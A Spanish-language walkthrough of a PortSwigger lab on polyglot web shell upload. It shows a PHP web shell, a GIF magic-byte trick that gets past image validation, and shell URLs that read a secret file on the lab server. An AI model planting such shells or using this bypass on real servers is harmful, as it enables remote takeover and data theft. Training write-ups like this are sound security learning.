---
title: Remote code execution via polyglot web shell upload
description: Laboratorio de Portswigger sobre File Upload Vulnerabilities
date: 2024-11-25 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - File Upload Vulnerabilities
tags:
  - Portswigger Labs
  - File Upload Vulnerabilities
  - Remote code execution via polyglot web shell upload
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` contiene una `función` de carga de imágenes `vulnerable`, aunque `verifica` el `contenido` del `archivo` para `confirmar` que es una imagen `genuina`, aún es posible cargar y `ejecutar código` del `lado` del `servidor`. Para resolver el laboratorio, debemos subir una web shell básica en `PHP`, utilizarla para `extraer` el `contenido` del archivo `/home/carlos/secret` y enviar este secreto utilizando el botón proporcionado en la barra del laboratorio. Podemos `iniciar sesión` con nuestra propia cuenta utilizando las siguientes credenciales: `wiener:peter`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_1.png)

Pulsamos en `My account` e `iniciamos sesión` con las credenciales `wiener:peter`

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_2.png)

Vemos que existe un `campo` de `subida` de `archivos`

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_3.png)

Si `inspeccionamos` con `donde` se `aloja` la `imagen` vemos que es en la ruta `/resources/images`

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_4.png)

Nos creamos un archivo llamado `shell.php` y lo `subimos`

```
<?php
    echo "<pre>" . system($_REQUEST['cmd']) . "</pre>";
?>
```

Al subir el archivo nos sale un error

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_5.png)

`Subimos` el `archivo` nuevamente pero `capturamos` la `petición` con `Burspuite`, he probado a subir un archivo con `extensión .png` y con `Content-type: image:/png` pero nos sigue dando el mismo `error`

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_6.png)

Esto puede ser debido a los `magic bytes` que tienen las imágenes [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures), en este caso he añadido `GIF8;` lo cual me ha permitido `bypassear` la `validación`

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_7.png)

Otra forma de hacerlo sería `descargar` una `imagen` e `introducir` la `web shell` dentro. Al `capturar` la `petición` con `Burpsuite` se cambiaría la `extensión` de archivo a `.php` y se `enviaría`

```
echo '<?php system($_REQUEST['cmd']); ?>' >> img.png
```

Abrimos nuevamente el `inspector` de `chrome` y vemos que el archivo subido se `aloja` en `/files/avatars`

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_8.png)

Si accedemos a `https://0aff00d7043967af80eda8750079008a.web-security-academy.net/files/avatars/shell.php?cmd=whoami` vemos que hemos logrado un `RCE (Remote Code Execution)`

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_9.png)

`Listamos` el `contenido` de la `home` de carlos `https://0aff00d7043967af80eda8750079008a.web-security-academy.net/files/avatars/shell.php?cmd=ls%20/home/carlos`

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_10.png)

`Obtenemos` el `contenido` del archivo secret `https://0aff00d7043967af80eda8750079008a.web-security-academy.net/files/avatars/shell.php?cmd=cat%20/home/carlos/secret`

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_11.png)

`Submiteamos` la `solución`

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_12.png)
